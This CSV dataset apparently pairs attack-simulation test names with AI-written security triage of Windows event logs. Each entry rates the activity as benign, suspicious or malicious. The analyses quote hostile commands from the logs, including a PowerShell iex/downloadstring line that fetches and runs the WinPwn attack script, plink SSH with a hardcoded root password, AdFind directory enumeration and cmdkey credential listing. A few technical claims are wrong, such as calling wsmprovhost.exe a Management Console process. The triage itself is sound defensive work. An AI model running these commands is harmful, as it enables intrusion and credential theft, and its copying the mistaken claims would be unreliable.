Directory Name,AI Response
Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,"Analyzing the provided Windows event logs across various channels (PowerShell, System, Sysmon, Security, and Application), here are some critical observations:

### PowerShell Logs:
- All PowerShell events show the execution of `powershell.exe & {get-addefaultdomainpasswordpolicy}`. This command retrieves the default domain password policy using Active Directory cmdlets, which might be typical for administrative or audit purposes. However, frequent or unauthorized use of such commands may indicate an attempt to gather password policy information potentially for lateral movement or privilege escalation. Given the user `SERVER002\admin_test` is executing these, it warrants verifying whether this aligns with normal administrative activities.

### System Logs:
- The system logs detail time synchronization activities with svchost.exe and interaction with the Windows Time Service (time.windows.com). The recorded time adjustments appear surrounding valid time synchronization activities, such as changes between `NewTime` and `OldTime`, appearing legitimate and without signs of manipulation or exploitation.
  
### Sysmon Logs:
- Multiple instances of `conhost.exe` and `wevtutil.exe` being invoked follow typical administrative operations, possibly for examining or managing Windows Event Logs. However, the concentration of activity within a narrow time window can be suspicious if not aligned with standard practices. The `admin_test` account is heavily involved here, suggesting a need to look at account activity and legitimacy.
- The execution of `whoami.exe` along with `hostname.exe` is standard for identity and system verification purposes but could also be used by an attacker to calibrate scripts to the target environment.
- The command-line argument details do not show any immediate malicious indicators, but consistency with administrative access is recommended for validation.

### Security Logs:
- Reflects time-change events associated with svchost.exe, a common prerequisite of time synchronization with no apparent anomaly. However, unusual or unauthorized time changes could be used to bypass time-based security checks or logs, but here they seem to be part of regular synchronization tasks.

### Application Logs:
- Contains entries related to the Software Protection Platform Service, typically related to license validation or activation, with no apparent suspicious activities.

### Assessment and Resolution:
- **Suspicious Activity:** There are several instances of administrative tools and PowerShell usage that appear bundled together within a short period. While these actions may be justified by a legitimate admin task, they could potentially be an indication of account misuse if not compliant with policy or authorized operation.

### Next Steps:
1. **User Activity Verification:** Investigate the activity under the `SERVER002\admin_test` account for context regarding task execution. Review roles and permissions to ensure that the actions comply with intended use.
2. **Log Review Expansion:** Check historical logs to find out if this behavior is routine for `admin_test` or anomalous. Look for login and logout patterns.
3. **Audit Policy:** Ensure detailed audit policies are in place for PowerShell and administrative actions.
4. **Anomaly Detection:** Implement or review detection rules for known usage patterns versus anomalies within administrative account activity and PowerShell command execution.

**Resolution:** **SUSPICIOUS**  
The logs contain behavior that warrants further investigation to confirm if activities are aligned with legitimate administrative duties or indicative of potential misuse or reconnaissance steps before a potential breach."
WinPwn - generaldomaininfo,"Upon analyzing the provided event logs, I observed the following:

### **Security Log:**
1. **EventID 4616**: These entries involve sytem time adjustment by ""NT AUTHORITY\LOCAL SERVICE"" using ""svchost.exe"". This can be normal behavior if synchronized with a domain controller or an NTP server for time adjustments; nothing suspicious noted here.

### **Windows PowerShell Log:**
1. **EventID 600**: The command `powershell.exe & {…,$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\r\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/'...)` is executed in the logs. This involves downloading and executing a PowerShell script from an external repository.
   - **Critical Observation**: Downloading and executing scripts from external resources using `iex` (Invoke-Expression) is risky and is a known method for executing malicious scripts. The URL `S3cur3Th1sSh1t/WinPwn` suggests potential exploration or attack tooling.

### **Application Log:**
1. **Windows Defender**: Indicates that Windows Defender is active.
2. **EventID 16384 by Software Protection Platform Service**: Normal event related to software protection.
3. **Edge Update Service**: Regular updates and service stops are seen; this seems standard.

### **System Log:**
No anomalies noted related to kernel general or time synchronization activities. These processes are expected on a system for regular operations.

### **Sysmon Log:**
1. **EventID 1 & 5**: Various processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `powershell.exe` are executed by `SERVER002\admin_test`.
2. **Critical Observation**: The presence of `powershell.exe` executing external scripts aligns with our earlier PowerShell log analysis. Additionally, processes like `wevtutil.exe` could be used for clearing event logs, which is often suspicious when used by non-standard users/admins.

### **Assessment:**

The presence of PowerShell events involving downloading and executing scripts from an external URL, especially from a GitHub repository related to penetration testing (""WinPwn""), is highly suspicious. The execution may pertain to administrative scripts, but without further context or justification, this presents a significant risk of compromise. The behavior aligns with potential malicious activity patterns.

### **Resolution: MALICIOUS**

Actions Required:
- **Investigate the User**: Gather more information about `SERVER002\admin_test` and their actions. Verify if these actions were authorized.
- **Check for Indicators of Compromise (IoCs)**: Look for any suspicious network traffic, changes in system configurations, or file modifications that align with the striking PowerShell commands.
- **Isolate and Analyze**: If the server is part of a critical network, consider isolating it to prevent potential lateral movement.
- **Alert and Respond**: Update detection tools to monitor similar activities. Notify the security team about this incident for further investigation.

Due to the execution of remote scripts from an unverified source, especially in a non-standard manner indicative of exploitation frameworks or enumeration scripts, this activity cannot be considered benign or simply suspicious without thorough investigation and risk validation."
ESXi - VM Discovery using ESXCLI,"### Detailed Analysis of the Logs:

**1. Event Log Patterns and Context:**

The logs provided indicate a range of standard operations on a Windows server, focusing on authentication events, privilege assignments, process creations, and task executions. Here is a breakdown of the key observations:

- **Authentication Events (Event ID 4624):** These represent successful logon events with LogonType 5, which is typically associated with a service startup. The entries follow legitimate processes such as `services.exe`.
  
- **Privileged Operations (Event ID 4672):** These indicate special privileges assigned to SYSTEM processes (e.g., SeTcbPrivilege, SeDebugPrivilege). These privileges might be normal for an inherent high-privilege process like SYSTEM.
  
- **Sysmon Events:**
  - **Process Creation (Event ID 1):** Multiple instances of process creation imply normal system behavior, although the execution of administrative utilities like `cmd.exe` with external network commands stands out.
  - **Process Termination (Event ID 5):** Typical process terminations seen after execution.

**2. Suspicious Activities:**

- **Usage of `cmd.exe` with Network Commands:**
  - A critical event is the execution of `cmd.exe` with parameters: `""cmd.exe\"" /c echo \""\"" | \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\plink.exe\"" \""file.local\"" -ssh  -l \""root\"" -pw \""pass\"" -m \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\esx_vmdiscovery.txt\""""`. This appears unusual as it involves the use of `plink.exe` (PuTTY link), which can establish SSH connections using a hardcoded password and executes remote commands.

- **Presence of `plink.exe`:** Typically used for SSH operations, the presence and execution from a temporary AppData location with sensitive operations suggest potential attempts to remotely access or control other systems.

**3. Other Noteworthy Observations:**

- **Event ID 4798:** Represents queries for local user/group enumerations, common in probing for available accounts.

- No direct indicators of failed logins, direct privilege escalation scripts, or malware processes. However, the presence of remote administration tools like `plink.exe` could be a concern if not validated as part of an IT-admin intended operation.

### Assessment:

Given the presence and execution of `plink.exe` with suspicious command-line arguments in a Windows environment, coupled with the fact that the execution appears to initiate from a user directory and interfaces with network resources, this behavior is deemed **SUSPICIOUS**. While it might serve administrative purposes, it equally indicates potential unauthorized access or policy violation merits deeper investigation.

### Recommendations:

- Investigate the origin and purpose of the `plink.exe` execution and confirm whether it is part of legitimate administrative tasks.
- Verify with the IT department if such remote commands are scheduled tasks or if they're unauthorized.
- Conduct a targeted threat hunt to confirm if other instances of `plink.exe` were executed in similar manners across the network.
- Tighten security policies around the execution of network-related utilities, especially those that can execute remote code.
- Consider auditing user-level execution capabilities extensively to trace back such privileged operations.

### Final Resolution:
- **SUSPICIOUS**: The logs suggest the use of remote administrative tools indicating either unauthorized or undersanctioned activities. Further investigation is advised."
WinPwn - printercheck,"Upon reviewing the provided Windows event logs, I've identified certain activities that warrant further attention. Here's the detailed analysis:

### Suspicious Activities Detected:

1. **PowerShell Activity with Network Calls:**
   - Several events indicate the execution of a PowerShell script using `powershell.exe` with parameters that include network activities. The script attempts to download and execute a script from a remote resource (GitHub):
     ```
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), printercheck -noninteractive -consoleoutput}
     ```
   - This behavior is highly indicative of potentially malicious activity, especially since it involves downloading and executing scripts from an external source without clear justification.

2. **Frequent Execution of Standard Utilities (wevtutil, conhost, whoami):**
   - The logs show numerous rapid-fire executions of standard Windows utilities such as `wevtutil`, `conhost`, and `whoami`, which is unusual for typical system or administrative activities. These could indicate attempts to enumerate system logs, manipulate event logs or conduct local reconnaissance.

3. **High Integrity Level Execution:**
   - The PowerShell script and other processes are executed with a high integrity level, which means they have elevated privileges. This could be an indicator of an exploitation attempt or a foothold gained by malicious actors to further compromise the system.

4. **No Clearly Benign Purpose for PowerShell Commands:**
   - Lack of sysadmin context or reported maintenance tasks reduces the likelihood that such PowerShell activity aligns with legitimate IT operations.

### Assessment of the Situation:

- **Threat/Risks Identified:**
  - The execution of PowerShell commands that download and run scripts from a remote source is a strong indicator of malicious actions, likely aiming at downloading tools for exploitation or performing lateral movements within the network.
  - The integrity level and execution pattern of standard utilities might suggest attempts to cover traces, escalate privileges, or harvest information.

### Guidance on How to Proceed:

1. **Containment:**
   - Immediately isolate the affected machine (`Server002`) from the network to prevent further spread or communication with external command and control servers.

2. **Investigation:**
   - Conduct a thorough forensic investigation focusing on PowerShell logs to understand the full scope and any possible payloads delivered by the remote script.
   - Inspect any related network connections and files downloaded from the identified URLs.

3. **Remediation:**
   - Patch and update all systems with the latest security updates.
   - Review and revise the access controls and privileges for accounts involved in this activity (e.g., `SERVER002\\admin_test`).

4. **Monitoring:**
   - Increase monitoring for unusual activities, especially processes launching commands like `powershell.exe` and downloads from unauthorized sources.

5. **Incident Report:**
   - Draft a detailed incident report and submit this to the internal security and operations teams for record and further analysis.

### Resolution:
- **Resolution: MALICIOUS**
  - Considering the network activities, elevated privilege process executions, and the context provided, the logs strongly indicate malicious activity. Steps should be taken immediately to address the potential compromise.

This assessment and resolution should be communicated timely to ensure organizational security measures are promptly enhanced."
Security Software Discovery - AV Discovery via WMI,"Upon reviewing the logs you provided, I have conducted a detailed analysis focusing on identifying any suspicious or anomalous behavior that may suggest malicious activity.

### Security Event Logs:
- **Event ID 4616**: This indicates a system time change, and we have two entries showing time adjustments involving `svchost.exe` and `LOCAL SERVICE`. While the presence of a time change event is worth noting, it is generally benign if it is a small, legitimate adjustment. These logs show slight time adjustments, which commonly occur during synchronization with a time server.

### Sysmon Logs:
- **Sysmon Event ID 5**: There are multiple instances where processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `wmic.exe` are executed by `SERVER002\admin_test`. The execution of these processes in close succession, particularly in conjunction with `cmd.exe` and `wmic.exe`, could potentially indicate a reconnaissance activity or script execution. The use of `wmic.exe` to query antivirus status might indicate an attempt to survey the system's defenses.
- **Sysmon Event ID 1**: The `cmd.exe` executed with the command line `""cmd.exe"" /c wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`. This command may be used for legitimate administrative tasks, but in a suspicious context, it could be part of a malicious script.

### System Logs:
- **Time Synchronization**: Similar to the security logs, these logs report on time synchronization activities between the host and a time server (`time.windows.com`). This is routine activity and doesn't usually indicate malicious intent unless part of a broader suspicious pattern.

### Assessment:
The primary concern here is the pattern of process executions, especially the combination of `wevtutil.exe` and `wmic.exe`, which may suggest potential reconnaissance or system enumeration activity. While system time changes are logged, they align with expected time synchronization activities.

### Resolution:
Given the context and lack of clear indicators of compromise:

- **Resolution: SUSPICIOUS**: The activities, particularly the use of command-line tools to gather system information, warrant further investigation. It would be prudent to:
  - Review user activity logs to understand what tasks the user `admin_test` was performing.
  - Check for any anomalies in authentication logs related to `admin_test`.
  - Verify if the executed scripts or commands were deliberate and part of known administrative tasks.
  - Conduct a network analysis to see if there are any unusual outbound connections associated with these process activities.

It's advisable to engage with the involved user or team for clarification on these activities and monitor for any additional suspicious patterns or attempts to access sensitive areas of the system."
File and Directory Discovery (cmd.exe),"Upon reviewing the log entries, here's the detailed analysis:

### System Log & Application Log:
- **Time Synchronization Events (EventID 24 and 1)**: These are related to time adjustments using the Windows Time Service. No signs of malicious manipulation detected.

- **Windows Update Events (EventID 44)**: Routine updates for various Microsoft products are recorded, showing normal patching behavior. No indications of unauthorized or unexpected updates.

- **Service Operations (EventID 16384, 16394)**: These are normal operations related to the Software Protection Platform Service and Windows Security Center, which indicate service start and stop operations as expected.

### Sysmon Log:
- **Whoami and Command Execution (EventID 1)**: The execution of `whoami.exe` and directory listing operations through `cmd.exe` could indicate information gathering which in some contexts might be considered suspicious. However, these are legitimate system binaries without abnormal command-line arguments or unusual parent-child relationships.

- **Wevtutil and Conhost Executions (EventID 5)**: The number of executions of `wevtutil.exe` and `conhost.exe` is high, but there is no evidence of malicious use based on provided data. These are standard processes often associated with system logs or command-line interactions.

- **Windows Update and EdgeUpdate Operations (EventID 1, 5)**: Multiple updates and related tasks for Microsoft Edge Update are observed but appear to be standard update behaviors.

### Security Log:
- **Logon and Privilege Events (EventID 4624, 4672)**: These entries show normal system operations, with no anomalies in logon patterns, impersonation levels, or elevated tokens.
  
- **Credential Validation Failures (EventID 5379)**: Multiple failed read operations on Windows Live/Microsoft account credentials are noted, but align with typical authentication attempts and do not deviate significantly from expected behavior.

Overall, the activities recorded in the logs suggest typical system operations such as time synchronization, software updates, service management, and standard user commands. The sporadic execution of common administrative tools (e.g., whoami, cmd) could warrant further investigation if paired with known compromise indicators, such as unauthorized network connections or data exfiltration attempts, but none are present here.

### Assessment:
Given the logs provided, there is no conclusive evidence pointing to a compromise or malicious activity. However, due to the nature of certain entries that are contextually ambiguous (e.g., frequent invocation of system binaries), and in absence of broader network context or additional threat intelligence, it is prudent to label the situation as requiring closer inspection.

### Conclusion:
Resolution: **SUSPICIOUS**
- **Recommendation**: It is advisable to correlate these logs with additional network traffic analysis and endpoint monitoring to ascertain if there has been any lateral movement or data exfiltration indicative of a potential threat, especially focusing on the context surrounding `cmd.exe` and file listing operations."
System Time Discovery W32tm as a Delay,"Based on the provided log entries, a detailed analysis reveals the following:

1. **Security Log (Event ID 4616)**: These events indicate a change in the system time, which was updated by the `svchost.exe` process. While time changes can be legitimate, frequent or unauthorized changes, especially by unexpected processes, can indicate malicious activity like time-based attacks or log manipulation.

2. **Sysmon Log**:
   - The execution of `whoami.exe`, `conhost.exe`, and `cmd.exe` with elevated privileges (integrity level ""High"") is noted. These actions by themselves are not inherently suspicious, as they are commonly used commands. However, they could be suspicious in certain contexts.
   - Frequent executions of `wevtutil.exe` and associations with `cmd.exe` for running time sync commands (`W32tm /stripchart ...`) could suggest attempts to enumerate or potentially manipulate event logs.
   - Multiple entries for Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are seen, triggered by the `NT AUTHORITY\SYSTEM`. These processes conform to expected behaviors typically associated with software updates and do not appear to indicate direct malicious activity.

3. **Windows System Log**:
   - The adjustment or synchronization of system time change is recorded again. This indicates a potential alignment or correction with an external time source, which is normal system behavior if aligned with trusted sources like `time.windows.com`.

4. **Application Log**:
   - Logs showing start/stop service events related to `edgeupdate` were observed. These are standard logs corresponding with the Edge update process and do not indicate any direct malicious actions.

**Assessment**:
- **Time Adjustments**: The multiple entries indicating system time adjustments warrant further attention. If these did not correspond to authorized maintenance windows or known issues with the time sync server, they could be a red flag.
- **Running Context**: The commands and processes ran under SYSTEM and admin-level contexts, which is expected on a server but should only occur under strictly controlled circumstances.
- **Edge Update Activity**: While numerous, the `MicrosoftEdgeUpdate.exe` entries relate to routine updates and are a legitimate process.

**Resolution**:
- **SUSPICIOUS**: The log entries do not provide definitive evidence of a compromise but do contain actions that warrant further investigation—specifically, the system time changes and context in which certain commands were executed. If possible, corroborate these activities with network logs, endpoint protection alerts, and validate user activity that might explain these changes.

**Guidance**: 
- Audit the system's time change policy to ensure adherence to organizational security standards.
- Verify the activity aligns with expected user behavior or maintenance tasks.
- If discrepancies persist, consider implementing advanced monitoring and create alerts for unauthorized time changes or unusual process behavior patterns.

Conclude with further scrutiny of any processes that can change system times or have implications on logging integrity."
Adfind - Query Active Directory Groups,"Upon analyzing the provided Windows event logs, the following points stand out:

### Security Log Summary
1. **EventID 4624 and 4672**: These events indicate a successful logon of the system account (`NT AUTHORITY\\SYSTEM`) with a logon type of 5 (Service). The process involved is `C:\\Windows\\System32\\services.exe`, which is typical behavior and normally benign for system operations. The set of privileges granted (SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, etc.) is consistent with typical system account operations.

### Sysmon Log Summary
2. **Process Execution**:
   - `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` by `SERVER002\\admin_test` user could raise concern if not expected, but there's no command-line detail to assess malicious intent.
   - Several instances of `wevtutil.exe` and `conhost.exe` by the same `admin_test` user. `wevtutil.exe` is used for event log manipulation, which might indicate log tampering or recon, while `CONHOST.EXE` is part of console operations.
   - Execution of `hostname.exe` and `whoami.exe` by `admin_test`, which might be normal administrative tasks. However, `whoami.exe` could be used in recon purposes to determine privileges.
   - The execution of `cmd.exe` with a command line pointing towards an unexpected path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe`) suggests potential reconnaissance tools usage. `AdFind.exe` is known for AD environment enumeration often used in penetration testing or malicious reconnaissance.

### Application Log Summary
3. **Windows Defender Activation**: The consistent `SECURITY_PRODUCT_STATE_ON` logs from Windows Defender indicate that the system's antivirus protection is active, which is a positive security sign.

### Analysis and Resolution
- **Suspicious Behaviors**:
  - The use of `powershell.exe`, `wevtutil.exe`, and especially `AdFind.exe` by `SERVER002\\admin_test` is suspicious, particularly if not aligned with typical administrative or operational tasks.
  - Potential log manipulation involvement via `wevtutil.exe` might indicate intent to hide tracks.
  
- **Threat Level**:
  - The presence and execution of `AdFind.exe` combined with the possible log tampering signal potential reconnaissance activity, which is often preparatory in advanced attacks.

### Resolution
- **Resolution**: **SUSPICIOUS**
  - The activity outlined requires further investigation to determine legitimacy or identify a breach. Specifically, verify user activities, the necessity of PowerShell usage, and reasons for executing potentially dual-use tools like `AdFind.exe`.
  
### Recommendations
- **Immediate Actions**:
  - Identify and validate the activities of `SERVER002\\admin_test` around the logged timeframe.
  - Check for unauthorized users and permissions on `SERVER002`.
  - Investigate the source and purpose of the `AdFind.exe`, ensuring it aligns with known tasks.
- **Further Steps**:
  - Review firewall and network logs for unusual outbound connections.
  - Conduct a full malware and threat scan, despite ongoing Defender protections.
  - Implement tighter logging and monitoring for suspicious tool usage like `PowerShell` and Windows event utilities.

By assessing these points, the aim is to clarify potential intrusions and ensure the robustness of the system’s security posture."
Hostname Discovery (Windows),"Upon reviewing the provided logs, the following analysis details suspicious or anomalous behavior:

1. **System Log:**
   - The events involving the Microsoft-Windows-Kernel-General provider (EventIDs 1 and 24) indicate multiple rapid changes in system time, presumably executed by the ""svchost.exe"" process. Time changes without a legitimate reason (e.g., daylight saving adjustments) might cause concern. However, here it seems to be synchronized with time.windows.com, suggesting legitimate time synchronization.

2. **Sysmon Log:**
   - The majority of the Sysmon logs show typical operations related to Microsoft Edge Update processes. The use of processes like `conhost.exe`, `cmd.exe`, `hostname.exe`, and `whoami.exe` appear to be routine command-line operations.
   - ""wevtutil.exe"" and ""conhost.exe"" under SERVER002\admin_test user could potentially be inspecting event logs or managing console windows; however, without any unusual command-line parameters or irregular timing, it does appear benign.

3. **Windows PowerShell Log:**
   - No information is provided here, implying no relevant activity logged by PowerShell in this timeframe.

4. **Application Log:**
   - Contains information about Microsoft Windows protection service and typical service stop messages, especially related to Microsoft Edge Update. There is nothing overtly suspicious beyond normal system operations.

5. **Security Log:**
   - EventID 4672 indicates ""admin_test"" was provided with several high-level privileges including SeDebugPrivilege, SeTakeOwnershipPrivilege, etc. If unusual, this could indicate potential misuse or privilege escalation. However, ""admin_test"" seems to be a legitimate admin account performing expected administrative tasks based on other log activities.
   - Multiple EventID 4624 logon sessions for ""admin_test"" show logons of type 3 (network), which are expected for services accessing resources on the network, showing consistency with authorized or automated remote access.

### Assessment & Conclusion:
Upon reviewing all logged events, there is minimal evidence of malicious behavior in the context provided. Most activities seem to be associated with routine updates and administrative operations, particularly those related to Microsoft Edge. Although the privilege escalation event could be suspicious, it aligns with the expected behavior for administrative tasks.

**Resolution: BENIGN**

### Guidance:
Although this examination does not reveal direct signs of compromise, it’s essential to monitor administrative accounts closely and ensure time synchronization settings and credentials are secure. Routine checks and audit logs should be consistently reviewed for any new anomalies outside expected operational activities."
Reg query for AlwaysInstallElevated status,"Based on the provided Windows event logs, here is a detailed analysis:

### System Log:
- The system log primarily contains entries related to Windows Updates, specifically concerning the ""Security Intelligence Update for Microsoft Defender Antivirus."" The entries showing updates being applied are typical and routine administrative actions for maintaining security. There are no signs of anomalies or malicious activity in these entries.

### Security Log:
- The security logs show Event ID 5379, which indicates a credential read operation. These attempts are related to system tasks and involve process creation under the SYSTEM account, as indicated by the ""SubjectUserSid"" as S-1-5-18. All attempts have a return code of 3221226021 (STATUS_LOGON_FAILURE), suggesting failed access to retrieve credentials. While observing multiple such entries can sometimes raise suspicion if seen in a different context, these pattern entries appear to coincide with routine system activity.

### Sysmon Log:
- Multiple instances of normal Windows utilities such as wevtutil.exe, conhost.exe, hostname.exe, whoami.exe, cmd.exe, and reg.exe are being executed. These processes are under the user `SERVER002\admin_test` running in high integrity, indicating they are running with elevated privileges.
- There is a command executed by `cmd.exe` querying registry keys relevant to the ""AlwaysInstallElevated"" policy:
  - This command checks if software installations can be done with elevated privileges even by non-admin users. Such actions could indicate a potential precursor to malicious activity if this policy setting is misused. Given the context, this activity suggests further investigation to ensure no malicious software installation attempts are made.
- Overall, the processes and command lines look generally legitimate, except for the registry query related to software installation, which is slightly unusual but not definitively malicious.

### Application Log:
- Displays a status message for Windows Defender indicating it is on and operational, which is a positive sign for system security status.

### Summary and Resolution:

- **Anomalous Behavior**: The only moderately suspicious activity is the query for the ""AlwaysInstallElevated"" registry key, which could potentially be exploited by malicious actors if improperly configured.
  
- **No Indications of Malicious Activity**: Despite the suspicious registry query, there is no definitive malicious activity evidenced within the logs. The processes and applications performed appear consistent with expected administrative activities.
  
- **Assessment**: The series of logged events do not provide sufficient evidence to declare a malicious incident. The suspicious registry query needs further scrutiny to rule out potential misconfigurations or exploitation risks.

- **Resolution**: **SUSPICIOUS**. The logs contain an activity (registry query) that doesn't seem entirely typical and warrants further investigation to confirm it is benign and secure. Further steps should include:
  - Reviewing system policies and configurations to ensure ""AlwaysInstallElevated"" is not set inappropriately.
  - Conducting a review of any recent administrative changes or software deployments that may coincide with the logged activities.
  - Verifying the actions of user `admin_test` around the time these events were generated to ensure they align with approved tasks."
Enumerate all accounts on Windows (Local),"In analyzing the provided event logs, several observations can be made about the activities on the host system, Server002.

### Key Observations:

1. **EdgeUpdate Activities**:
    - There are multiple entries from the Microsoft Edge Update process (MicrosoftEdgeUpdate.exe), running under the `NT AUTHORITY\SYSTEM` account. 
    - These processes are executing commands related to software update procedures, such as `/update` and `/regsvc`.
    - The presence of many EdgeUpdate-related events is not necessarily suspicious given that Edge auto-updates itself; however, the frequency and specific command-line arguments should be cross-referenced with expected behaviors.

2. **Command Executions**:
    - There is a Sysmon event (EventID 1) showing `cmd.exe` executing potentially information-gathering commands: `net user`, `dir c:\Users\`, `cmdkey.exe /list`, `net localgroup ""Users""`.
    - This activity was initiated by `wsmprovhost.exe`, a legitimate Microsoft Management Console process but is often used in lateral movement attacks if compromised.

3. **Credential Access Events**:
    - Security log EventID 5379 indicates an operation where credentials were attempted to be read, but none were returned, as indicated by `CountOfCredentialsReturned: 0`. This operation involved `cmdkey.exe`, known to be used for credential listing and credential access.
  
4. **Multiple EdgeUpdate Executions**:
    - EdgeUpdate processes are seen running from temporary directories, which can sometimes indicate a non-standard update or installation path, though it might still be legitimate.
    - Multiple consecutive executions could imply either legitimate updating or unnecessary repetition based on misconfigurations or potential tampering.

5. **User Activities**:
    - The `SERVER002\admin_test` account appears in multiple event entries, using various system utilities like `hostname.exe`, `whoami.exe`, `net.exe`, etc. These actions are often seen in both legitimate administrative operations and malicious reconnaissance.

6. **Automated/System Processes**:
    - System and known administrative processes like `wsmprovhost.exe`, `svchost.exe`, `wevtutil.exe`, and `conhost.exe` are running, which is standard, but their command-line execution should be verified for legitimacy in the context of the server's operations.

### Assessment:

- **Suspicious Behavior**:
  - The use of `cmd.exe` with commands like `net user` and `cmdkey.exe /list` indicates a potential information gathering or credential harvesting attempt.
  - Multiple rapid-fire operations and executions by the `admin_test` user suggest either intense legitimate administrative tasks or an automation exploiting this account.
  - The frequent execution of Edge related processes from temporary folders should be examined, as legitimate installations typically use specific standard paths.

### Recommended Actions:

- **Monitor and Validate**: Conduct a more in-depth review of the `edgeupdate` activities to ensure they correlate with legitimate update processes.
- **Credential Audit**: Verify the actions around `cmdkey.exe` for unintended credential listing; review any alerts correlating with security best practices.
- **User Activity Review**: Investigate the `admin_test` user’s activity to ascertain if this matches expected behavior. Cross-check with any centralized logging for any remote access or unusual patterns.
- **Log Review Enhancement**: Consider setting up alerts for key tools and commands like `cmd.exe`, `net.exe`, and `cmdkey.exe` to catch rare usage patterns that may indicate malicious activity.

### Resolution:
- **SUSPICIOUS** - While there are no explicit signs of malicious activity, there are enough unusual and potentially harmful signs in the logs that warrant further investigation to ensure system integrity and security."
Adfind - Enumerate Active Directory Computer Objects,"### Analysis of Logs:

Upon reviewing the provided event logs, there are several points to consider regarding potentially suspicious or anomalous behavior:

1. **Repeated Credential Validation Failure (Event ID 5379):**
   - There are multiple instances of Event ID 5379, indicating failed credential validation attempts. The `ReturnCode` `3221226021` suggests an error due to invalid credentials or insufficient login rights for a specific user (`MicrosoftAccount:user=02txoixylodcstop`). Although these could be benign, repeated failures could indicate attempts at unauthorized access or probing.

2. **High Privilege Operations (Event ID 4672):**
   - Privilege assignments were made to the `SYSTEM` user (`SeDebugPrivilege`, `SeSecurityPrivilege`, etc.). Although legitimate under normal operations, monitoring or investigation is recommended if this occurs outside expected maintenance periods or by unexpected users.

3. **Sysmon Logs - Use of PowerShell and AdFind:**
   - The Sysmon logs indicate the execution of `powershell.exe` by the `SERVER002\admin_test` user. While PowerShell is a common tool for system administration, it is also frequently used in attack vectors due to its powerful script execution capability.
   - The use of `AdFind.exe` through `cmd.exe` suggests potential reconnaissance activity, especially when combined with obfuscated file paths (e.g., `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..`). `AdFind.exe` is commonly used to query Active Directory and can indicate lateral movement or domain enumeration attempts.

4. **Windows Update and Security Health:**
   - The logs show routine operations related to Windows Update and Windows Defender Antivirus updates. These are normally benign and suggest the system is up-to-date. Logs indicate updates were executed successfully with related services being triggered (`UsoClient.exe`, `MusNotification.exe`).

### Assessment:

- **Suspicious Activity Detected:** While many events could be legitimate system behavior, the presence of `AdFind.exe`, the use of PowerShell, and repeated credential validation failures are indicators that deserve further investigation. Combined, these actions resemble common techniques used during a cyber attack lifecycle for reconnaissance and potential privilege escalation.

### Threats/Risks Identified:

- Potential unauthorized access attempts due to repeated credential validation failures.
- Possible reconnaissance activity indicated by the use of `AdFind.exe` and PowerShell.

### Guidance on How to Proceed:

1. **Investigate User Activity:**
   - Verify whether the account `SERVER002\admin_test` had legitimate reasons for executing commands via PowerShell and `AdFind.exe`.
   - Check for any unusual login times or patterns that coincide with these activities.

2. **Monitor and Review:** 
   - Continue monitoring for similar events, especially under Privilege Use, Logon/Logoff, and Process Creation events.
   - Ensure logging and alerting are in place to quickly detect future anomalies in these categories.

3. **Security Audit:**
   - Conduct a full audit of system and network activity around the times of these logs.
   - Ensure firewall rules, access controls, and user permissions conform to the principle of least privilege.

### Final Resolution:

Based on the indicators observed, the log review concludes with a resolution of **SUSPICIOUS**. The activity requires additional investigation to rule out or confirm potential compromise."
Enumerate All Network Shares with Snaffler,"### Detailed Analysis:

Upon analyzing the provided Windows event logs, several activities warrant discussion due to their potentially suspicious nature:

1. **PowerShell Activity**:
   - There are several PowerShell events indicating the use of `Invoke-Expression` to execute commands. The specific command involves executing a file called `Snaffler.exe` from a temporary directory.
   - The command further uses encoded PowerShell commands, a method often employed to obfuscate and hide the execution of malicious scripts or binaries. 
   - The usage of `start-sleep` and `stop-process` indicates an attempt to manage the execution flow and termination of the `Snaffler` process, potentially to avoid detection.

2. **Sysmon Activity**:
   - The Sysmon logs show multiple instances of command line executions involving `cmd.exe`, `powershell.exe`, and `Snaffler.exe`, linking them all together. 
   - The `conhost.exe` and `cmd.exe` usage in sequential command spawning further supports the instance of suspicious behavior, often characteristic of tool execution commonly associated with reconnaissance or lateral movement within a network. 
   - The presence of a file utility `wevtutil.exe` suggests system logs might be getting queried or cleared, which attackers often carry out to reduce evidence of their activities.

3. **Privilege Escalation Events**:
   - Security logs (`EventID: 4672`) show that high privileges are being requested by the `admin_test` user, encompassing several potentially dangerous privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`.

4. **Security Activity**: 
   - The logs show NTLM Logon (`EventID: 4624`) from a workstation named `DESKTOP-3HL5B2P`. This can indicate a possible lateral movement vector if this was unauthorized.
   - Logins also involve elevated tokens, which pose questions about intentional or unintentional privilege escalation.

Given these observed behaviors, particularly the usage of encoded PowerShell commands combined with the execution of `Snaffler.exe`, an application commonly used for network reconnaissance, and high-level privilege requests, this gives a reasonably high suspicion of malicious intent.

### Assessment of the Situation:
- The activities logged strongly indicate reconnaissance and potential lateral movement activities within the network, utilizing administrative privileges and obfuscation methods.

### Threats or Risks Identified:
- Potential data exposure due to network reconnaissance.
- Security risks associated with privilege escalation.
- Lateral movement within the network that could lead to further compromises or significant damage.

### Guidance on How to Proceed:
- **Immediate**: Isolate the system (Server002) from the network to prevent further propagation.
- **Forensic Analysis**: Conduct a thorough forensic analysis on the affected system to identify any potential breaches or data accessed.
- **Review Access**: Check login logs from `DESKTOP-3HL5B2P` and the `admin_test` user for unauthorized access.
